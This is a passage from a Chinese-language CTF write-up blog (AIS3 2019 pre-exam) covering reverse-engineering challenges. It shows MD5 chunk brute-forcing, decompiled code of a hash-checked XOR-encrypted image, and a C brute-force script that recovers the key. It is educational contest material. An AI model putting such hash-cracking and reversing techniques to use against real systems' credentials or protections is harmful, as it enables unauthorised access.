class="line"></span><br><span class="line">    <span class="keyword">return</span> arg.decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag += <span class="string">&#x27;0&#x27;</span> * (<span class="built_in">len</span>(flag) % <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flag), <span class="number">4</span>):</span><br><span class="line">    print(Hash(md5(<span class="built_in">bytes</span>(flag[i:i + <span class="number">4</span>],<span class="string">&#x27;ascii&#x27;</span>)).hexdigest()))</span><br></pre></td></tr></table></figure>
<p>搭配給定的output.txt裡面的md5就可以暴力破解出md5了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ba3a7f3bd92a5d418f5e16886db62674 : AIS3</span><br><span class="line">33e4500b205b80e52dd52e796cba8b7d : &#123;7he</span><br><span class="line">7d1c09bbf2025facf6bd0fec0ec6a780 : re_1</span><br><span class="line">9cedd8dee7b5b87838d7a9bed76df8e5 : 5_th</span><br><span class="line">764d30cb4807c5a870a47b53be6cf662 : e_k1</span><br><span class="line">f1e8fda6c3ff87e43905ea1690624c64 : ll3r</span><br><span class="line">d7939cb11edaa9b1fb05efb4e2946f75 : _ra6</span><br><span class="line">5ae001ebd955475c867617bdb72e7728 : 61t&#125;</span><br></pre></td></tr></table></figure>

<p>flag: <code>AIS3&#123;7here_15_the_k1ll3r_ra661t&#125;</code></p>
<h3 id="0neWay"><a href="#0neWay" class="headerlink" title="0neWay"></a>0neWay</h3><p>這題當初解的超辛苦的ww</p>
<p>拿到一個執行檔，跑起來叫我回答三個問題</p>
<p>先拿IDA F5後拿到一個看起來是驗證的功能</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">hash</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// [rsp+0h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 i; <span class="comment">// [rsp+10h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = a1;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">5381L</span>L; ; i = <span class="number">33</span> * i + (<span class="keyword">unsigned</span> __int8)*v1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = v3++;</span><br><span class="line">    <span class="keyword">if</span> ( !*v1 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 v3; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">void</span> *v8; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> key_len; <span class="comment">// [rsp+8h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [rsp+Ch] [rbp-54h]</span></span><br><span class="line">  <span class="keyword">void</span> *ptr; <span class="comment">// [rsp+10h] [rbp-50h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">char</span> key[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-40h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+28h] [rbp-38h]</span></span><br><span class="line">  __int64 v15; <span class="comment">// [rsp+30h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [rsp+38h] [rbp-28h]</span></span><br><span class="line">  __int16 v17; <span class="comment">// [rsp+3Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v18; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v18 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *(_QWORD *)key = <span class="number">0L</span>L;</span><br><span class="line">  v14 = <span class="number">0L</span>L;</span><br><span class="line">  v15 = <span class="number">0L</span>L;</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;-----&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I encrypted a image in this binary,&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;you have to answer my questions to decrypt it,&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;cuz only my friends can view this secret image&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;-----&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Who am I? (lowercase)&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%4s&quot;</span>, key);</span><br><span class="line">  key_len = <span class="built_in">strlen</span>(key);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How old am I?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%2s&quot;</span>, &amp;key[key_len]);</span><br><span class="line">  key_len = <span class="built_in">strlen</span>(key);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What the name of my first pet? (lowercase)&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%20s&quot;</span>, &amp;key[key_len]);</span><br><span class="line">  key_len = <span class="built_in">strlen</span>(key);</span><br><span class="line">  v3 = hash(&amp;key_len);</span><br><span class="line">  v4 = key_len;</span><br><span class="line">  v5 = hash(key);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s, %lu, %d, %lu&quot;</span>, key, v5, v4, v3);</span><br><span class="line">  <span class="keyword">if</span> ( hash(&amp;key_len) == <span class="number">177593</span> &amp;&amp; hash(key) == <span class="number">8932587927620123215L</span>L )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr = &amp;binary_flag_jpg_start;</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    stream = fopen(<span class="string">&quot;./flaggggg.jpg&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( stream )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( ptr != &amp;binary_flag_jpg_end )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = v10++;</span><br><span class="line">        *(_BYTE *)ptr ^= key[v7 % key_len];</span><br><span class="line">        v8 = ptr;</span><br><span class="line">        ptr = (<span class="keyword">char</span> *)ptr + <span class="number">1</span>;</span><br><span class="line">        fwrite(v8, <span class="number">1u</span>LL, <span class="number">1u</span>LL, stream);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;you got my secret photo&quot;</span>);</span><br><span class="line">      fclose(stream);</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;write file error !&quot;</span>);</span><br><span class="line">      result = <span class="number">-2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;haker haker go away&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>因為知道的是jpg，而且jpg的檔頭跟檔尾是固定的加上他有給長度的限制，所以我們可以leak出一些key的內容，剩下再透過暴力破解就好</p>
<p>不過要注意jpg有些版本資訊不太一樣，所以這邊我是一個一個試試看的</p>
<p>寫了份腳本跑了很久很久終於找到key</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> LEN = <span class="number">20</span>;</span><br><span class="line"><span class="keyword">int64_t</span> target_hash = <span class="number">8932587927620123215L</span>L;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int64_t</span> <span class="title">hash</span><span class="params">( <span class="keyword">char</span> *a1 )</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int64_t</span> h = <span class="number">5381</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="keyword">int</span> i = <span class="number">0</span> ; a1[ i ] ; ++ i )</span><br><span class="line">        h = <span class="number">33</span> * h + ( ( <span class="keyword">uint8_t</span> ) a1[ i ] );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* &#x27;!&#x27; means not sure */</span></span><br><span class="line">    <span class="comment">//////////////////////////!/////!!</span></span><br><span class="line">    <span class="keyword">char</span> ans[] = <span class="string">&quot;nini??ididnot?????et&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">char</span> a=<span class="string">&#x27;0&#x27;</span>;a&lt;=<span class="string">&#x27;9&#x27;</span>;++a)&#123;</span><br><span class="line">        ans[<span class="number">4</span>]=a;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">char</span> b=<span class="string">&#x27;0&#x27;</span>;b&lt;=<span class="string">&#x27;9&#x27;</span>;++b)&#123;</span><br><span class="line">            ans[<span class="number">5</span>]=b;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">char</span> c=<span class="string">&#x27;a&#x27;</span>;c&lt;=<span class="string">&#x27;z&#x27;</span>;++c)&#123;</span><br><span class="line">                ans[<span class="number">13</span>]=c;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">char</span> d=<span class="string">&#x27;a&#x27;</span>;d&lt;=<span class="string">&#x27;z&#x27;</span>;++d)&#123;</span><br><span class="line">                    ans[<span class="number">14</span>]=d;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">char</span> e=<span class="string">&#x27;a&#x27;</span>;e&lt;=<span class="string">&#x27;z&#x27;</span>;++e)&#123;</span><br><span class="line">                        ans[<span class="number">15</span>]=e;</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">char</span> f=<span class="string">&#x27;a&#x27;</span>;f&lt;=<span class="string">&#x27;z&#x27;</span>;++f)&#123;</span><br><span class="line">                            ans[<span class="number">16</span>]=f;</span><br><span class="line">                            <span class="keyword">for</span>(<span class="keyword">char</span> g=<span class="string">&#x27;a&#x27;</span>;g&lt;=<span class="string">&#x27;z&#x27;</span>;++g)&#123;</span><br><span class="line">                                ans[<span class="number">17</span>]=g;</span><br><span class="line">                                <span class="keyword">if</span>(hash(ans)==target_hash)&#123;</span><br><span class="line">                                    <span class="built_in">puts</span>(ans);</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;sad&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>成功輸進去後就拿到一個帶有flag的jpg</p>
<p><img src="0neWay_flaggggg.jpg" alt="problem 0neWay&#39;s flag"></p>
<p>所以flag就是<code>AIS3&#123;Did_y0u_t5y_t0_65u7e_f0rc3_7h1s&#125;</code></p>
<p>但看到官解才發現根本不需要那麼麻煩QQ</p>
<p>似乎有某塊直接leak出key了</p>
<h3 id="MasterPiece"><a href="#MasterPiece" class="headerlink" title="MasterPiece"></a>MasterPiece</h3><p>一個windows的QT題，沒解過windows相關的reverse題，也不太會用拿x64dbg，只好果斷放棄</p>
<h3 id="Game"><a href="#Game" class="headerlink" title="Game"></a>Game</h3><p>又是一題windows題，原本想拿cheat engine玩玩看，但用不太出來，也不知道哪邊會有flag</p>
<p>一樣只好放棄，看官解原來是他會有類似跑馬燈的效果顯示flag…</p>
<h3 id="BigO1"><a href="#BigO1" class="headerlink" title="BigO1"></a>BigO1</h3><p>看起來像是跟之前benson事件有關的東東</p>
<p>不過因為我沒辦法用ida f5了，然後也沒空認真讀組語就放棄了</p>
<p>看官解看起來是要用gdb做事QQ</p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><p>我的pwn真的廢到笑，所以就不想寫題解了，反正我也只解一題QQ..</p>
<p>看看上面的大佬都會做pwn，我這暑假真的要好好來學pwn了</p>

  </article>
  <aside class="table-content" id="site-toc">
  <div class="table-content-title">
    <i class="fa fa-arrow-right fa-lg" id="site-toc-hide-btn"></i>
    <span>目录</span>
  </div>
  <div class="table-content-main">
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Simple-Window"><span class="toc-text">Simple Window</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hidden"><span class="toc-text">Hidden</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#d1v1n6"><span class="toc-text">d1v1n6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3v4l"><span class="toc-text">3v4l</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#d1v1n6-d33p3r"><span class="toc-text">d1v1n6 d33p3r</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tokeeeeen"><span class="toc-text">tokeeeeen</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BabySSRF"><span class="toc-text">BabySSRF</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TCash"><span class="toc-text">TCash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Random-Guess"><span class="toc-text">Random Guess</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RSA202"><span class="toc-text">RSA202</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RSA101"><span class="toc-text">RSA101</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CbC"><span class="toc-text">CbC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MaoHash"><span class="toc-text">MaoHash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ReSolveFinaL"><span class="toc-text">ReSolveFinaL</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Are-you-admin"><span class="toc-text">Are you admin?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Crystal-Maze"><span class="toc-text">Crystal Maze</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#KcufsJ"><span class="toc-text">KcufsJ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Welcome"><span class="toc-text">Welcome</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pysh"><span class="toc-text">Pysh</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mind-Reading"><span class="toc-text">Mind Reading</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WTF"><span class="toc-text">WTF</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Trivial"><span class="toc-text">Trivial</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TsaiBro"><span class="toc-text">TsaiBro</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HolyGrenade"><span class="toc-text">HolyGrenade</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0neWay"><span class="toc-text">0neWay</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MasterPiece"><span class="toc-text">MasterPiece</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Game"><span class="toc-text">Game</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BigO1"><span class="toc-text">BigO1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-text">Pwn</span></a></li></ol>
  </div>
</aside>
  
  
    <div class="passage-tags">
     
      <a href="/tags/AIS3/"><i class="fa fa-tags"></i>AIS3</a>
     
      <a href="/tags/CTF/"><i class="fa fa-tags"></i>CTF</a>
    
    </div>
  
</div>


    </main>
    
      
<div class="site-comment-contanier" data-plateform="disqus">
  
    <div id="disqus_thread"></div>
    <script async>
      var disqus_config = function() {
        this.page.url = `${window.location.origin}${window.location.pathname}`;
        this.page.identifier = "AIS3-2019-pre";
      };
      (function() {
        var d = document, s = d.createElement('script');
        s.src = 'https://ctf-ototot.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
      })();
    </script>
  
</div>

    
    <div class="site-footer-wrapper">
  <footer class="site-footer">
    
      
        <div class="site-footer-col">
          <h5 class="site-footer-title">更多關於我</h5>
          
            <span class="site-footer-item">
              <a href="https://oi.ototot.tw" target="_blank">OI解題雜筆</a>
            </span>
          
            <span class="site-footer-item">
              <a href="https://codeforces.com/profile/oToToT" target="_blank">Codeforces</a>
            </span>
          
            <span class="site-footer-item">
              <a href="https://ctftime.org/user/46758" target="_blank">CTF Time</a>
            </span>
          
        </div>
      
    
<!--
    <div class="site-footer-info">
      <i class="fa fa-clock-o"></i> 本站已稳定运行<span id="site-time"></span>
    </div>
-->
    
    
      <div class="site-footer-info">
        <i class="fa fa-at"></i> Email: ty1208chiang@gmail.com
      </div>
    
    <div class="site-footer-info">
      <i class="fa fa-copyright"></i> 
      2019 <a href="https://github.com/dongyuanxin/theme-ad/" target="_blank">Theme-AD</a>.
      Created by <a href="https://godbmw.com/" target="_blank">GodBMW</a>.
      All rights reserved.
    </div>
  </footer>
</div>

    <div id="site-layer" style="display:none;">
  <div class="site-layer-content">
    <div class="site-layer-header">
      <span class="site-layer-header-title" id="site-layer-title"></span>
      <i class="fa fa-close" id="site-layer-close"></i>
    </div>
    <div class="site-layer-body" id="site-layer-container">
      <div class="site-layer-input" id="site-layer-search" style="display: none;">
        <div class="site-layer-input-choose">
          <a href="javascript:void(0);" title="Change Search Engine">Google</a>
        </div>
        <input type="text">
        <i class="fa fa-search"></i>
      </div>
      
      <div id="site-layer-welcome" style="display:none;"></div>
    </div>
  </div>
</div>
    

<div class="bottom-bar">
  <div class="bottom-bar-left">
    <a href="/passages/AIS3-2019-EOF/" data-enable="true">
      <i class="fa fa-arrow-left"></i>
    </a>
    <a href="/passages/hello-world/" data-enable="true">
      <i class="fa fa-arrow-right"></i>
    </a>
  </div>
  <div class="bottom-bar-right">
    <a href="javascript:void(0);" data-enable="true" id="site-toc-show-btn">
      <i class="fa fa-bars"></i>
    </a>
    
      <a href="#disqus_thread" data-enable="true">
        <i class="fa fa-commenting"></i>
      </a>
    
    <a href="javascript:void(0);" id="site-toggle-share-btn">
      <i class="fa fa-share-alt"></i>
    </a>
    
    <a href="javascript:void(0);" id="back-top-btn">
      <i class="fa fa-chevron-up"></i>
    </a>
  </div>
</div>
    <div id="share-btn">
  
    <a id="share-btn-twitter" href="javascript:void(0);" target="_blank">
      <i class="fa fa-twitter"></i>
    </a>
  
  
    <a id="share-btn-facebook" href="javascript:void(0);" target="_blank">
      <i class="fa fa-facebook"></i>
    </a>
  
  
  
  
</div>
    
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-43236443-6"></script>
  <script async>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-43236443-6');
  </script>






    
  </body>
</html>